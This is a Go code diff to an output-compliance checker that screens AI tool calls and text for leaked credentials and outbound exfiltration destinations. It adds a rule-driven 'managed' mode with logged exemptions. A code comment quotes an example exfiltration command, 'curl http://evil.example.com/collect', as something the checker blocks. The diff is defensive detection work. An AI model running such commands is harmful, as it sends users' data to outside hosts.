@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"errors"
 	"net"
+	"slices"
 	"strconv"
 	"strings"
 
@@ -129,6 +130,7 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 	if c.sanitizer == nil {
 		return nil, ErrNilSanitizer
 	}
+	ctx = WithAuthenticatedTenant(ctx, tenant)
 	if label == "__tool_fragment" {
 		// Full JSON is checked at terminal/EOF; fragments may contain opaque data
 		// or split escapes that cannot be interpreted independently.
@@ -159,7 +161,8 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 	// 的值是登录身份不是机密，且裸用户名永远不可能以占位符形态出现，
 	// 按 credentialField 一律阻断等于结构性掐断一切带用户名的工具调用。
 	// r1024b：模型自造的占位拼写同理放行（见 placeholderCredentialValues）。
-	if label != "" && secretCredentialField(label) && text != "" && !isMarker && !isPlaceholderCredentialValue(label, text) {
+	ctx = WithRuleField(ctx, "", label)
+	if !c.managed() && label != "" && secretCredentialField(label) && text != "" && !isMarker && !isPlaceholderCredentialValue(label, text) {
 		marker := RedactionMarker(TypeSecret)
 		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: marker, Issues: []outputcompliance.ComplianceIssue{{Type: "sensitive", Subtype: "credential", Content: marker, Severity: 8}}}, nil
 	}
@@ -185,7 +188,7 @@ func (c *outputSensitiveChecker) unsafeToolValueDetail(ctx context.Context, valu
 		// r1024b：模型自造的占位拼写（"PLACEHOLDER"/"TODO"/"<...>"）不是
 		// 泄漏的真值，不触发密码族明文阻断——否则并行工具调用里一个早产
 		// 的占位值会把同轮全部合法调用一并掐断。
-		if _, marker := ParsePlaceholder(value); secretCredentialField(label) && value != "" && !marker && !isPlaceholderCredentialValue(label, value) {
+		if _, marker := ParsePlaceholder(value); !c.managed() && secretCredentialField(label) && value != "" && !marker && !isPlaceholderCredentialValue(label, value) {
 			setToolIssue(issue, "credential", path)
 			return true, nil
 		}
@@ -199,12 +202,19 @@ func (c *outputSensitiveChecker) unsafeToolValueDetail(ctx context.Context, valu
 			}
 			return c.unsafeToolValueDetail(ctx, embedded, label, depth+1, toolName, path, issue)
 		}
-		if isInertContentTool(toolName) {
+		if !c.managed() && isInertContentTool(toolName) {
 			// 惰性内容载体（Write/Edit 写文件等）：参数是被写的数据，不是被
 			// 执行的命令。其中的 URL/地址是文本引用，不构成外传目的地——
 			// 与 assistant 纯文本出现 URL 时的处理（脱敏路径、不阻断）对齐。
 			return false, nil
 		}
+		if _, marker := ParsePlaceholder(value); marker {
+			return false, nil
+		}
+		if secretCredentialField(label) && isPlaceholderCredentialValue(label, value) {
+			return false, nil
+		}
+		ctx = WithRuleField(ctx, toolName, label)
 		fragments, err := c.detectEgress(ctx, value)
 		if err != nil {
 			return false, err
@@ -220,10 +230,16 @@ func (c *outputSensitiveChecker) unsafeToolValueDetail(ctx context.Context, valu
 			// 工具名）。与 r1024 的身份/密码族拆分同一条原理：身份不是机密。
 			// 其余非地址片段（email/secret 等）保持原有阻断契约
 			// （r1017 公网 user@host / r1028 真实凭据样值）。
-			if fragment.Type == TypeAccount {
+			if c.managed() && isInertContentTool(toolName) && slices.Contains(fragment.Exemptions, "inert_tool") {
+				c.observe(ctx, fragment, "exempted")
 				continue
 			}
-			if isNonExfiltrationFragment(fragment) {
+			if fragment.Type == TypeAccount && (!c.managed() || slices.Contains(fragment.Exemptions, "identity")) {
+				c.observe(ctx, fragment, "exempted")
+				continue
+			}
+			if isNonExfiltrationFragment(fragment) && (!c.managed() || slices.Contains(fragment.Exemptions, "nonroutable_destination")) {
+				c.observe(ctx, fragment, "exempted")
 				// 2026-10-08 minimax-m3/glm-5.3 fail-closed incident: the
 				// server_ip pattern matches any IPv4, and dev tooling echoes
 				// 127.0.0.1 / RFC1918 targets in model-generated commands
@@ -235,6 +251,7 @@ func (c *outputSensitiveChecker) unsafeToolValueDetail(ctx context.Context, valu
 				// (TestGeneratedSensitiveToolOperationsAreBlocked contract).
 				continue
 			}
+			c.observe(ctx, fragment, "block")
 			reason := string(fragment.Type)
 			if scopedType(fragment.Type) || fragment.Type == TypeEmail {
 				reason = "egress_destination"
@@ -246,7 +263,7 @@ func (c *outputSensitiveChecker) unsafeToolValueDetail(ctx context.Context, valu
 		// （curl http://evil.example.com/collect）一律畅通。判定与 IP 侧同一条
 		// 底线：默认公网可达即阻断，只豁免明确不可路由的主机。见 egress_host.go。
 		// 放在片段循环之后：两套规则互相独立，私网 IP 的豁免不会被这里撤销。
-		if hasPublicHostDestination(value) {
+		if !c.managed() && hasPublicHostDestination(value) {
 			setToolIssue(issue, "egress_destination", path)
 			return true, nil
 		}
@@ -397,11 +414,15 @@ func isNonExfiltrationAddress(value string) bool {
 	return false
 }
 
-func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text string) (*outputcompliance.ComplianceResult, error) {
+func (c *outputSensitiveChecker) Check(ctx context.Context, tenant string, text string) (*outputcompliance.ComplianceResult, error) {
 	if c.sanitizer == nil {
 		return nil, ErrNilSanitizer
 	}
+	ctx = WithAuthenticatedTenant(ctx, tenant)
 	fragments, err := c.sanitizer.detector.Detect(ctx, text)
+	if errors.Is(err, ErrRuleBlocked) {
+		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: RedactionMarker(TypeSecret)}, nil
+	}
 	if err != nil {
 		return nil, err
 	}
@@ -410,6 +431,7 @@ func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text strin
 	if len(spans) == 0 {
 		return result, nil
 	}
+	block := c.action == OutputBlock && !c.managed()
 	var safe strings.Builder
 	last := 0
 	for _, span := range spans {
@@ -417,11 +439,17 @@ func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text strin
 		safe.WriteString(RedactionMarker(span.typ))
 		last = span.end
 		result.Issues = append(result.Issues, outputcompliance.ComplianceIssue{
-			Type: "sensitive", Subtype: string(span.typ), Content: RedactionMarker(span.typ), Severity: 8, Score: 1, Redacted: c.action != OutputBlock,
+			Type: "sensitive", Subtype: string(span.typ), Content: RedactionMarker(span.typ), Severity: 8, Score: 1, Redacted: !block,
 		})
 	}
 	safe.WriteString(text[last:])
 	result.RedactedOutput = safe.String()
-	result.Blocked = c.action == OutputBlock
+	result.Blocked = block
 	return result, nil
+}
+
+func (c *outputSensitiveChecker) observe(ctx context.Context, f SensitiveFragment, action string) {
+	if d, ok := c.sanitizer.detector.(*PatternDetector); ok {
+		d.observeFragment(ctx, f, action)
+	}
 }
